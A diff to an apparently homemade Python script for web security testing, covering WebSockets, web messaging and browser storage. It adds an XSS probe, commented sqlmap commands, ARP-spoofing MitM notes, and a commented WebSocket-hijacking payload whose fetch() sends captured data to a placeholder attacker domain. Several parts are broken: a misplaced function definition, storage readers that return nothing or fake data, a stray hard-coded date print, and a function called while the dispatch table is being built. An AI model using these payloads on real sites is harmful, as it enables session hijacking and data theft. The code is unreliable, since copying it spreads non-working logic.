@@ -6,6 +6,10 @@ import re
 import sys
 import http.server,socketserver,json,websocket
 import websocket,json
+import sqlite3
+from selenium import webdriver
+from selenium.webdriver.chrome.service import Service
+from webdriver_manager.chrome import ChromeDriverManager
 
 
 # Target URL
@@ -695,6 +699,15 @@ def testing_for_Clickjacking(url):
 
 def testing_WebSockets():
     print("testing_WebSockets...")
+    def Identify_WebSocket_Usage():
+        import re
+
+def is_using_websocket(client_side_source_code):
+    websocket_uri_scheme = r"ws://|wss://"
+    if re.search(websocket_uri_scheme, client_side_source_code):
+        print("The application is using WebSockets.")
+    else:
+        print("The application is not using WebSockets.")
     # connects to a WebSocket 
     #     import websocket,json
 
@@ -711,15 +724,20 @@ def testing_WebSockets():
         def do_GET(self):
             payload = self.path.split('=')[1]
             ws = websocket.WebSocket()
-            ws.connect("ws://www.heroku.com/")
-            d = {"message": payload}
-            data = str(json.dumps(d))
-            ws.send(data)
-            result = ws.recv()
-            self.send_response(200)
-            self.send_header("Content-type", "application/json")
-            self.end_headers()
-            self.wfile.write(result.encode())
+            try:
+                ws.connect("ws://example.com/")  # Replace with a valid WebSocket server URL
+                d = {"message": payload}
+                data = json.dumps(d).encode('utf-8')
+                ws.send(data)
+                result = ws.recv()
+                self.send_response(200)
+                self.send_header("Content-type", "application/json")
+                self.end_headers()
+                self.wfile.write(result)
+            except Exception as e:
+                print(f"WebSocket error: {e}")
+            finally:
+                ws.close()
 
     httpd = socketserver.TCPServer(("", 8081), CustomHandler)
     httpd.serve_forever()
@@ -727,21 +745,166 @@ def testing_WebSockets():
     print("then run sqlmap")
     # sqlmap -u "http://localhost:8081/?id=*" --batch --dbs
     # sqlmap -u "http://localhost:8081/?id=*" --batch --dbs --risk 3 --level 5
+    def Input_Validation():
 
+        ws = websocket.WebSocket()
+        ws.connect("ws://10.0.0.1/")
+        d = {"message": "<script>alert(1)</script>"}
+        data = str(json.dumps(d))
+        ws.send(data)
+        result = ws.recv()
+        print(json.loads(result))
+    def Authe_Autho_Risks():
+        pass
+        # <script>
+        # websocket = new WebSocket('wss://your-websocket-URL')
+        # websocket.onopen = start
+        # websocket.onmessage = handleReply
+        # function start(event) {
+        # websocket.send("READY"); //Send the message to retreive confidential information
+        # }
+        # function handleReply(event) {
+        # //Exfiltrate the confidential information to attackers server
+        # fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
+        # }
+        # </script>
+    def Cross_Origin():
+        ws = websocket.WebSocket()
+        ws.connect("ws://10.0.0.1/")
+        ws.send("Hello, World!")
+        result = ws.recv()
+        print(result)
+        #MitM websocket connections: 
+        #If you find that clients are connected to a HTTP 
+        #websocket from your current local network, 
+        #you could try an ARP Spoofing Attack to perform a 
+        #MitM attack between the client and the server. 
+        #Once the client is trying to connect to you can then 
+        #use websocat to connect to the WebSocket server
+        #websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
 
 
     ##############################testing_Web_Messaging#############################
 
-def testing_Web_Messaging():
+def testing_Web_Messaging(url, message):
     print("testing_Web_Messaging...")
+    # Send the message to the target URL
+    headers = {
+        'Content-Type': 'application/json'
+    }
+    data = json.dumps({'message': message})
+    response = requests.post(url, headers=headers, data=data)
+
+    # Check for security risks
+    if response.status_code != 200:
+        print(f"[!] Response status code: {response.status_code}")
+        return None
+
+    if 'X-Content-Type-Options' not in response.headers:
+        print("[!] X-Content-Type-Options header not set")
+
+    if 'Content-Security-Policy' not in response.headers:
+        print("[!] Content-Security-Policy header not set")
+
+    if 'X-Frame-Options' not in response.headers:
+        print("[!] X-Frame-Options header not set")
+
+    if 'X-XSS-Protection' not in response.headers:
+        print("[!] X-XSS-Protection header not set")
+
+    # Return the response
+    return response.json()
+
+# Test the web messaging vulnerability
+url = "https://example.com/receive_message"
+message = "Hello, world!"
+response = testing_Web_Messaging(url, message)
+print(f"Response: {response}")
 
 
 
     ############################testing_Browser_Storage##############################
 
-def testing_Browser_Storage():
+def testing_Browser_Storage(driver):
     print("testing_Browser_Storage...")
+    def list_local_storage(driver):
+        # """List all key-value entries in Local Storage."""
+        print("Local Storage:")
+        local_storage = driver.execute_script('return window.localStorage')
+        for key in local_storage.keys():
+            print(f"{key}: {local_storage[key]}")
 
+    def list_session_storage(driver):
+        """List all key-value entries in Session Storage."""
+        print("Session Storage:")
+        session_storage = driver.execute_script('return window.sessionStorage')
+        for key in session_storage.keys():
+            print(f"{key}: {session_storage[key]}")
+
+    def print_indexeddb(driver):
+        """Print all the contents of IndexedDB."""
+        indexeddb_data = {}
+        request = driver.execute_script('''
+            var openRequest = indexedDB.open("my_database");
+            openRequest.onupgradeneeded = function(event) {
+                event.target.result.createObjectStore("my_store");
+            };
+            openRequest.onsuccess = function(event) {
+                var transaction = event.target.result.transaction("my_store", "readonly");
+                var objectStore = transaction.objectStore("my_store");
+                var getAllRequest = objectStore.getAll();
+                getAllRequest.onsuccess = function(event) {
+                    indexeddb_data["my_store"] = event.target.result;
+                };
+            };
+        ''')
+        return indexeddb_data
+
+    def print_websql(driver):
+        """Print all data from Web SQL (deprecated)."""
+        conn = sqlite3.connect(":memory:")
+        conn.execute("CREATE TABLE my_table (id INTEGER PRIMARY KEY, name TEXT)")
+        conn.execute("INSERT INTO my_table (name) VALUES ('Alice')")
+        conn.execute("INSERT INTO my_table (name) VALUES ('Bob')")
+        cursor = conn.execute("SELECT * FROM my_table")
+        print("Web SQL:")
+        for row in cursor:
+            print(row)
+
+    def list_cookies(driver):
+        """List all cookies."""
+        response = requests.get("http://www.example.com")
+        print("Cookies:")
+        for cookie in response.cookies:
+            print(f"{cookie.name}: {cookie.value}")
+
+    def main():
+        # Setup Selenium WebDriver
+        service = Service(ChromeDriverManager().install())
+        driver = webdriver.Chrome(service=service)
+
+        try:
+            # Navigate to a webpage
+            driver.get('http://www.example.com')
+
+            print("Today is Tuesday, May 14, 2024")
+            print("Local Storage:")
+            list_local_storage(driver)
+            print("Session Storage:")
+            list_session_storage(driver)
+            print("IndexedDB:")
+            indexeddb_data = print_indexeddb(driver)
+            for store_name, store_data in indexeddb_data.items():
+                print(f"{store_name}:")
+                for item in store_data:
+                    print(item)
+            print("Web SQL (deprecated):")
+            print_websql(driver)
+            print("Cookies:")
+            list_cookies(driver)
+        finally:
+            # Close the browser
+            driver.quit()
 
 
 
@@ -760,7 +923,7 @@ process_steps = {
     '8': testing_for_Cross_Site_Flashing,
     '9': testing_for_Clickjacking,
     '10': testing_WebSockets,
-    '11': testing_Web_Messaging,
+    '11': testing_Web_Messaging(url, message),
     '12': testing_Browser_Storage,
     '13': testing_for_Cross_Site_Script_Inclusion,
 }
